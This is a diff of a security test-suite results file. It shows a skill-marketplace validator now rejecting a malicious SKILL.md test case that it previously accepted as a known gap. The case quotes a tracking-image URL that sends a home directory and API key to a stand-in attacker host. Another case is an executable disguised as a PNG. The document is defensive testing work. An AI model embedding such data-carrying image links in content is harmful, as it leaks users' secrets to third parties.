@@ -6,20 +6,18 @@
   },
   "passed": true,
   "confusion": {
-    "truePositive": 11,
-    "falseNegative": 1,
+    "truePositive": 12,
+    "falseNegative": 0,
     "falsePositive": 0,
     "trueNegative": 12
   },
   "metrics": {
-    "recall": 0.9166666666666666,
+    "recall": 1,
     "recallExcludingKnownGaps": 1,
     "precision": 1,
     "falsePositiveRate": 0
   },
-  "knownGapsStillOpen": [
-    "m09-remote-image"
-  ],
+  "knownGapsStillOpen": [],
   "failures": [],
   "cases": [
     {
@@ -244,11 +242,12 @@
       "label": "malicious",
       "category": "hostile-markdown",
       "note": "a remote tracking image whose URL carries data, in SKILL.md",
-      "verdict": "accept",
-      "stage": "none",
-      "reason": "all checks passed (verified)",
-      "failedChecks": [],
-      "knownGap": "The Skills Guard and the file policy accept a SKILL.md containing a remote tracking image (![x](https://evil.example/pixel.png?...)). Not fixed here: skills_guard.py is vendored and R27 keeps it unmodified in this release. Mitigation lives in the renderer: the Marketplace UI never loads remote images from a stranger's SKILL.md (Task 9, live-verified 0 requests to the evil host). Proposed fix: flag markdown/HTML image URLs with a query string or non-allowlisted host in skill.ts."
+      "verdict": "reject",
+      "stage": "validate",
+      "reason": "no-remote-images: remote images load from a third party when the document is viewed: SKILL.md: \"https://evil.example/pixel.png?u=USER_HOME_DIR&k=API_KEY\"",
+      "failedChecks": [
+        "no-remote-images"
+      ]
     },
     {
       "id": "m10-nested-archive",
@@ -269,8 +268,9 @@
       "note": "an ELF executable named logo.png",
       "verdict": "reject",
       "stage": "validate",
-      "reason": "file-policy: references/logo.png: contents do not match the magic bytes of a .png file",
+      "reason": "no-hidden-executables: executable-looking files (references/logo.png) but the manifest does not declare the exec.script permission",
       "failedChecks": [
+        "no-hidden-executables",
         "file-policy"
       ]
     },
